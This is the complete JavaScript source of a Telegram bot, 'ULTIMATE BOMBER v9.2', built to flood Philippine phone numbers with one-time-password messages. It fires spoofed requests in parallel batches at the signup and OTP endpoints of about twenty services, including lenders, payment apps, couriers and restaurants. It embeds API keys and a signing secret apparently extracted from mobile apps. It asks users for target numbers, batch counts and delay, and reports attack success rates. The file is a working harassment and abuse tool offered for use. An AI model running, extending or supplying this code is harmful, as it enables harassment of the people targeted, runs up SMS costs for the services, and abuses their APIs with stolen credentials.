// ============================================================
// ULTIMATE BOMBER v9.2 — Vercel Serverless Edition
// Telegraf webhook + Upstash Redis session store + logo
// Установка: npm i telegraf axios @upstash/redis
// ============================================================

const { Telegraf, Markup, session } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const { Redis } = require('@upstash/redis');

// ---- ENV ----
const BOT_TOKEN = process.env.BOT_TOKEN;
const PUBLIC_BOT_URL = process.env.PUBLIC_BOT_URL || 'https://t.me/YourPublicBot';
const LOGO_URL = process.env.LOGO_URL || 'https://example.com/logo.png';
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'change_me_secret';
const VERCEL_URL = process.env.VERCEL_URL || 'your-app.vercel.app';
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

if (!BOT_TOKEN) throw new Error('BOT_TOKEN missing');

const redis = (REDIS_URL && REDIS_TOKEN)
    ? new Redis({ url: REDIS_URL, token: REDIS_TOKEN })
    : null;

const bot = new Telegraf(BOT_TOKEN);

// ---- REDIS-BACKED SESSION ----
function redisSession() {
    return async (ctx, next) => {
        if (!redis) { ctx.session = ctx.session || {}; return next(); }
        const key = `sess:${ctx.from?.id || 'anon'}:${ctx.chat?.id || 'x'}`;
        try {
            const raw = await redis.get(key);
            ctx.session = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : {};
        } catch { ctx.session = {}; }
        await next();
        try { await redis.set(key, JSON.stringify(ctx.session || {}), { ex: 3600 }); } catch {}
    };
}
bot.use(redisSession());

// ---- UTILS ----
function randomString(len = 12) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
    return out;
}
function formatPhone(phone) {
    let p = String(phone).trim().replace(/[\s\-+]/g, '');
    if (p.startsWith('0')) p = p.slice(1);
    else if (p.startsWith('63')) p = p.slice(2);
    return p;
}
function validatePhone(phone) { return /^9\d{9}$/.test(formatPhone(phone)); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function httpPost(url, headers, data) {
    try {
        const r = await axios({ url, method: 'post', headers, data, timeout: 5000, validateStatus: () => true });
        return { status: r.status, data: r.data };
    } catch (e) { return { status: 0, data: null, error: e.message }; }
}

// ---- WORKERS ----
async function mwellSend(phone) {
    try {
        const fm = formatPhone(phone);
        const headers = {
            'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
            'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
            'x-app-version': ['03.942.035','03.942.036','03.942.037'][Math.floor(Math.random()*3)],
            'x-device-type': 'android',
            'x-device-model': ['oneplus CPH2465','samsung SM-G998B'][Math.floor(Math.random()*2)],
            'x-timestamp': String(Date.now()), 'x-request-id': randomString(16)
        };
        const data = { country: 'PH', phoneNumber: fm, phoneNumberPrefix: '+63' };
        const r = await httpPost('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers, data);
        if (r.status === 200 && r.data && r.data.c === 200) return { ok: true, msg: 'OTP sent' };
        return { ok: false, msg: `MWELL ${r.status}` };
    } catch { return { ok: false, msg: 'MWELL err' }; }
}

async function pexxSend(phone) {
    try {
        const fm = formatPhone(phone);
        const headers = {
            'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
            'x-msession-id': 'undefined', 'x-oid': '', 'tid': randomString(11), 'appversion': '3.0.14',
            'sentry-trace': randomString(32),
            'baggage': `sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=${randomString(32)}`
        };
        const data = { '0': { json: { email: '', areaCode: '+63', phone: `+63${fm}`, otpChannel: 'TG', otpUsage: 'REGISTRATION' } } };
        const r = await httpPost('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers, data);
        if (r.status === 200 && Array.isArray(r.data)) {
            const rd = r.data[0]?.result?.data?.json || {};
            if (rd.code === 200) return { ok: true, msg: 'OTP sent' };
            return { ok: false, msg: rd.msg || 'PEXX fail' };
        }
        return { ok: false, msg: `PEXX ${r.status}` };
    } catch { return { ok: false, msg: 'PEXX err' }; }
}

// ---- 20 SERVICES ----
const OSIM_URL = 'https://prod.services.osim-cloud.com/identity/api/v1.0/account';

async function bombOtp(phone) {
    try {
        const fm = formatPhone(phone);
        const headers = { 'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465)', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'accept-language': 'en-SG', 'region': 'PH' };
        const data = { userName: fm, phoneCode: '63', password: `TempPass${Math.floor(1000+Math.random()*9000)}!` };
        const r = await httpPost(`${OSIM_URL}/register`, headers, data);
        if (r.status === 200) { const code = r.data?.resultCode || 0; return { ok: [201000,200000].includes(code), msg: r.data?.message || 'Bomb' }; }
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function ezloan(phone) {
    try {
        const fm = formatPhone(phone);
        const t = Date.now();
        const headers = { 'User-Agent': 'okhttp/4.9.2', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'imei': '7a997625bd704baebae5643a3289eb33', 'device': 'android', 'buildtype': 'release', 'brand': 'oneplus', 'model': 'CPH2465', 'manufacturer': 'oneplus', 'source': 'EZLOAN', 'channel': 'GooglePlay_Blue', 'appversion': '2.0.4', 'appversioncode': '2000402', 'version': '2.0.4', 'versioncode': '2000401', 'sysversion': '16', 'sysversioncode': '36', 'customerid': '', 'businessid': 'EZLOAN', 'phone': '', 'appid': 'EZLOAN', 'authorization': '', 'blackbox': `kGPGg${t}DCl3O8MVBR0` };
        const data = { businessId: 'EZLOAN', contactNumber: `+63${fm}`, appsflyerIdentifier: `${t}-${Math.floor(1e18+Math.random()*9e18)}` };
        const r = await httpPost('https://gateway.ezloancash.ph/security/auth/otp/request', headers, data);
        if (r.status === 200) return { ok: r.data?.code === 0, msg: r.data?.msg || 'Sent' };
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function xpress(phone, idx) {
    try {
        const headers = { 'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json', 'Accept': 'application/json' };
        const t = Math.floor(Date.now()/1000);
        const data = { FirstName: `User${t}_${idx}`, LastName: 'Test', Email: `user${t}_${idx}@gmail.com`, Phone: `+63${formatPhone(phone)}`, Password: `Pass${Math.floor(1000+Math.random()*9000)}`, ConfirmPassword: `Pass${Math.floor(1000+Math.random()*9000)}` };
        const r = await httpPost('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers, data);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OTP sent' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function abenson(phone) {
    try {
        const headers = { 'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' };
        const r = await httpPost('https://api.mobile.abenson.com/api/public/membership/activate_otp', headers, `contact_no=${phone}&login_token=undefined`);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OK' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function excellent(phone) {
    try {
        const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json' };
        const data = { domain: phone, cat: 'login', previous: false, financial: randomString(32) };
        const r = await httpPost('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', headers, data);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OK' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function bistro(phone) {
    try {
        const fm = formatPhone(phone);
        const headers = { 'Host': 'bistrobff-adminservice.arlo.com.ph:9001', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16)', 'Accept': 'application/json, text/plain, */*', 'Accept-Encoding': 'gzip, deflate, br', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua': '"Chromium";v="142"', 'sec-ch-ua-mobile': '?1', 'origin': 'http://localhost', 'x-requested-with': 'com.allcardtech.bistro', 'referer': 'http://localhost/', 'accept-language': 'en-US' };
        const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${fm}`;
        const r = await axios({ url, method: 'get', headers, timeout: 5000, validateStatus: () => true });
        if (r.status === 200) return { ok: r.data?.isSuccessful === true, msg: r.data?.message || 'OTP sent' };
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function bayad(phone) {
    try {
        const fm = formatPhone(phone);
        const headers = { 'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US', 'authorization': '', 'content-type': 'application/json', 'origin': 'https://www.online.bayad.com', 'referer': 'https://www.online.bayad.com/', 'sec-ch-ua': '"Chromium";v="127"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 10)' };
        const data = { mobileNumber: `+63${fm}`, emailAddress: `${randomString(8)}@gmail.com` };
        const r = await httpPost('https://api.online.bayad.com/api/sign-up/otp', headers, data);
        return { ok: r.status === 200, msg: r.status === 200 ? `OTP to ${data.emailAddress}` : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function lbc(phone) {
    try {
        const headers = { 'User-Agent': 'Dart/2.19 (dart:io)', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' };
        const body = new URLSearchParams({ verification_type: 'mobile', client_email: `${randomString(8)}@gmail.com`, client_contact_code: '+63', client_contact_no: formatPhone(phone), app_log_uid: randomString(16) }).toString();
        const r = await httpPost('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', headers, body);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OK' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function pickup(phone) {
    try {
        const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json', 'Accept': 'application/json' };
        const data = { mobile_number: `+63${formatPhone(phone)}`, login_method: 'mobile_number' };
        const r = await httpPost('https://production.api.pickup-coffee.net/v2/customers/login', headers, data);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OTP sent' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function honey(phone) {
    try {
        const headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json', 'Accept': 'application/json' };
        const data = { phone, is_rights_block_accepted: 1 };
        const r = await httpPost('https://api.honeyloan.ph/api/client/registration/step-one', headers, data);
        if (r.status === 200) return { ok: r.data?.success === true, msg: r.data?.message || 'OK' };
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function kumu(phone) {
    try {
        const fm = formatPhone(phone);
        const t = Math.floor(Date.now()/1000);
        const rnd = randomString(32);
        const sig = crypto.createHash('sha256').update(`${t}${rnd}${fm}kumu_secret_2024`).digest('hex');
        const headers = { 'User-Agent': 'okhttp/5.0.0-alpha.14', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json;charset=UTF-8', 'Device-Type': 'android', 'Device-Id': '07b76e92c40b536a', 'Version-Code': '1669', 'X-kumu-Token': '', 'X-kumu-UserId': '', 'Pre-Install': '' };
        const data = { country_code: '+63', encrypt_rnd_string: rnd, cellphone: fm, encrypt_signature: sig, encrypt_timestamp: t };
        const r = await httpPost('https://api.kumuapi.com/v2/user/sendverifysms', headers, data);
        if (r.status === 200) return { ok: [200,403].includes(r.data?.code), msg: r.data?.message || 'OTP sent' };
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function s5(phone) {
    try {
        const fm = `+63${formatPhone(phone)}`;
        const b = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
        const headers = { 'accept': 'application/json, text/plain, */*', 'content-type': `multipart/form-data; boundary=${b}`, 'user-agent': 'Mozilla/5.0 (Linux; Android 15)' };
        const body = `--${b}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${fm}\r\n--${b}--\r\n`;
        const r = await httpPost('https://api.s5.com/player/api/v1/otp/request', headers, body);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OK' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function cashalo(phone) {
    try {
        const fm = formatPhone(phone);
        const dev = crypto.randomUUID().replace(/-/g,'').slice(0,16);
        const af = `${Date.now()}-${Math.floor(Math.random()*1e15)}`;
        const ad = crypto.randomUUID();
        const fb = crypto.randomBytes(16).toString('hex');
        const headers = { 'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==', 'x-device-identifier': dev, 'x-device-type': '1', 'x-firebase-instance-id': fb };
        const data = { phone_number: fm, device_identifier: dev, device_type: 1, apps_flyer_device_id: af, advertising_id: ad };
        const r = await httpPost('https://api.cashaloapp.com/access/register', headers, data);
        if (r.status === 200) {
            if (r.data && r.data.access_challenge_request) return { ok: true, msg: `Challenge ${String(r.data.access_challenge_request).slice(0,10)}` };
            return { ok: false, msg: 'Unexpected' };
        }
        return { ok: false, msg: `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}

async function genericOtp(phone, url, ua) {
    try {
        const headers = { 'User-Agent': ua, 'Content-Type': 'application/json' };
        const data = { phone: `+63${formatPhone(phone)}`, mobileNumber: `+63${formatPhone(phone)}` };
        const r = await httpPost(url, headers, data);
        return { ok: r.status === 200, msg: r.status === 200 ? 'OK' : `HTTP ${r.status}` };
    } catch { return { ok: false, msg: 'Err' }; }
}
const gcash = p => genericOtp(p, 'https://api.gcash.com/v1/auth/otp', 'Mozilla/5.0 (Linux; Android 14)');
const paymaya = p => genericOtp(p, 'https://api.paymaya.com/auth/v1/otp', 'PayMaya/3.0');
const shopee = p => genericOtp(p, 'https://shopee.ph/api/v1/otp/request', 'Shopee/2.0');
const lazada = p => genericOtp(p, 'https://lazada.com.ph/api/otp', 'Lazada/3.0');
const grab = p => genericOtp(p, 'https://api.grab.com/v1/otp', 'Grab/4.0');
const angkas = p => genericOtp(p, 'https://api.angkas.com/v1/otp', 'Angkas/2.0');
const jollibee = p => genericOtp(p, 'https://api.jollibee.com.ph/v1/otp', 'Jollibee/1.0');

const SERVICES = [
    ['BOMB OTP', bombOtp], ['EZLOAN', ezloan], ['XPRESS PH', xpress], ['ABENSON', abenson],
    ['EXCELLENT LENDING', excellent], ['BISTRO', bistro], ['BAYAD CENTER', bayad], ['LBC CONNECT', lbc],
    ['PICKUP COFFEE', pickup], ['HONEY LOAN', honey], ['KUMU PH', kumu], ['S5.COM', s5],
    ['CASHALO', cashalo], ['GCASH', gcash], ['PAYMAYA', paymaya], ['SHOPEE', shopee],
    ['LAZADA', lazada], ['GRAB', grab], ['ANGLKAS', angkas], ['JOLLIBEE', jollibee]
];

// ---- ATTACK ----
async function attackSingle(phone, batches, delay, progressCb) {
    const totalBombs = (SERVICES.length + 2) * batches;
    let done = 0;
    let success = 0, fail = 0;
    for (let batch = 1; batch <= batches; batch++) {
        const tasks = [];
        for (const [name, fn] of SERVICES) {
            if (name === 'XPRESS PH') tasks.push(fn(phone, batch));
            else tasks.push(fn(phone));
        }
        tasks.push(mwellSend(phone));
        tasks.push(pexxSend(phone));
        const results = await Promise.allSettled(tasks);
        for (const res of results) {
            if (res.status === 'fulfilled' && res.value.ok) success++;
            else fail++;
            done++;
            if (progressCb) progressCb(done, totalBombs, success, fail);
        }
        if (delay > 0) await sleep(delay * 1000);
    }
    return { success, fail, total: done };
}

// ---- UI ----
function mainMenu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Full Attack', 'attack')],
        [Markup.button.callback('📊 Statistics', 'stats')],
        [Markup.button.url('🖼 Logo', LOGO_URL)],
        [Markup.button.url('🤖 Public Bot', PUBLIC_BOT_URL)],
        [Markup.button.callback('❌ Exit', 'exit')]
    ]);
}
function welcomeText() {
    return `ULTIMATE BOMBER v9.2 – Vercel Edition\n\n20 services · parallel · OTP flood\n\nSelect an option:`;
}
async function sendWelcome(ctx) {
    try {
        await ctx.replyWithPhoto(LOGO_URL, { caption: welcomeText(), ...mainMenu() });
    } catch {
        await ctx.reply(welcomeText(), mainMenu());
    }
}

bot.start(sendWelcome);

bot.action('attack', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.session.step = 'await_targets';
    ctx.session.targets = null;
    await ctx.reply('Enter target number(s), format 09123456789 (comma-separated for multiple):');
});

bot.action('stats', async (ctx) => {
    await ctx.answerCbQuery();
    let s = { total: 0, success: 0, fail: 0 };
    if (redis) {
        try { s = (await redis.get(`stats:${ctx.from.id}`)) || s; } catch {}
    }
    const rate = s.total ? ((s.success / s.total) * 100).toFixed(2) : '0.00';
    await ctx.reply(`📊 Attack Statistics\n\nTotal: ${s.total}\nSuccess: ${s.success}\nFail: ${s.fail}\nRate: ${rate}%`, mainMenu());
});

bot.action('exit', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply('Bot stopped. Use /start to restart.');
});

bot.action('confirm_yes', async (ctx) => {
    await ctx.answerCbQuery();
    const p = ctx.session.pending;
    if (!p) return ctx.reply('No pending attack.');
    ctx.session.pending = null;
    ctx.session.step = null;

    const statusMsg = await ctx.reply(`🚀 Attacking ${p.targets.length} target(s) with ${p.batches} batches...`);
    let aggSuccess = 0, aggFail = 0, aggTotal = 0;
    let lastUpdate = 0;

    for (const phone of p.targets) {
        await attackSingle(phone, p.batches, p.delay, (done, total, s, f) => {
            const now = Date.now();
            if (now - lastUpdate > 1500 || done === total) {
                lastUpdate = now;
                bot.telegram.editMessageText(
                    statusMsg.chat.id, statusMsg.message_id, undefined,
                    `🚀 Attacking +63${formatPhone(phone)}\nProgress: ${done}/${total}\nSuccess: ${s} | Fail: ${f}`
                ).catch(() => {});
            }
        }).then(r => { aggSuccess += r.success; aggFail += r.fail; aggTotal += r.total; });
    }

    if (redis) {
        try { await redis.set(`stats:${ctx.from.id}`, { total: aggTotal, success: aggSuccess, fail: aggFail }, { ex: 86400 }); } catch {}
    }
    const rate = aggTotal ? ((aggSuccess / aggTotal) * 100).toFixed(2) : '0.00';
    await ctx.reply(`✅ Attack finished\n\nTotal: ${aggTotal}\nSuccess: ${aggSuccess}\nFail: ${aggFail}\nRate: ${rate}%`, mainMenu());
});

bot.action('confirm_no', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.session.pending = null;
    ctx.session.step = null;
    await ctx.reply('Cancelled.', mainMenu());
});

bot.on('text', async (ctx, next) => {
    const step = ctx.session.step;
    const text = ctx.message.text.trim();
    if (step === 'await_targets') {
        const phones = text.split(',').map(s => s.trim()).filter(Boolean);
        const valid = phones.filter(validatePhone);
        if (!valid.length) return ctx.reply('No valid targets.');
        ctx.session.targets = valid;
        ctx.session.step = 'await_batches';
        return ctx.reply(`Valid targets: ${valid.length}\nSend batches count (1-100):`);
    }
    if (step === 'await_batches') {
        let batches = parseInt(text, 10);
        if (isNaN(batches) || batches < 1) batches = 1;
        if (batches > 100) batches = 100;
        ctx.session.batches = batches;
        ctx.session.step = 'await_delay';
        return ctx.reply(`Batches: ${batches}\nSend delay in seconds (default 0.0001):`);
    }
    if (step === 'await_delay') {
        let delay = parseFloat(text);
        if (isNaN(delay) || delay < 0) delay = 0.0001;
        ctx.session.pending = { targets: ctx.session.targets, batches: ctx.session.batches, delay };
        ctx.session.step = null;
        return ctx.reply(
            `Launch attack?\nTargets: ${ctx.session.pending.targets.join(', ')}\nBatches: ${ctx.session.pending.batches}\nDelay: ${delay}s`,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ Yes', 'confirm_yes')],
                [Markup.button.callback('❌ No', 'confirm_no')]
            ])
        );
    }
    return next();
});

bot.command('stats', async (ctx) => {
    let s = { total: 0, success: 0, fail: 0 };
    if (redis) { try { s = (await redis.get(`stats:${ctx.from.id}`)) || s; } catch {} }
    const rate = s.total ? ((s.success / s.total) * 100).toFixed(2) : '0.00';
    await ctx.reply(`Total: ${s.total}\nSuccess: ${s.success}\nFail: ${s.fail}\nRate: ${rate}%`);
});

bot.command('logo', async (ctx) => sendWelcome(ctx));

// ---- VERCEL HANDLER ----
module.exports = async (req, res) => {
    // GET /api/bot?setWebhook=1 -> register webhook
    if (req.method === 'GET' && req.query.setWebhook === '1') {
        try {
            const url = `https://${VERCEL_URL}/api/bot`;
            await bot.telegram.setWebhook(url, { secret_token: WEBHOOK_SECRET });
            return res.status(200).json({ ok: true, webhook: url });
        } catch (e) {
            return res.status(500).json({ ok: false, error: e.message });
        }
    }
    if (req.method === 'GET' && req.query.deleteWebhook === '1') {
        try { await bot.telegram.deleteWebhook(); return res.status(200).json({ ok: true }); }
        catch (e) { return res.status(500).json({ ok: false, error: e.message }); }
    }
    if (req.method === 'GET' && req.query.info === '1') {
        try { const info = await bot.telegram.getWebhookInfo(); return res.status(200).json(info); }
        catch (e) { return res.status(500).json({ ok: false, error: e.message }); }
    }

    // POST /api/bot -> handle update
    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'Method Not Allowed' });
    }
    if (req.headers['x-telegram-bot-api-secret-token'] !== WEBHOOK_SECRET) {
        return res.status(401).json({ ok: false });
    }
    try {
        await bot.handleUpdate(req.body);
        return res.status(200).json({ ok: true });
    } catch (e) {
        console.error('handleUpdate error', e);
        return res.status(200).json({ ok: true });
    }
};
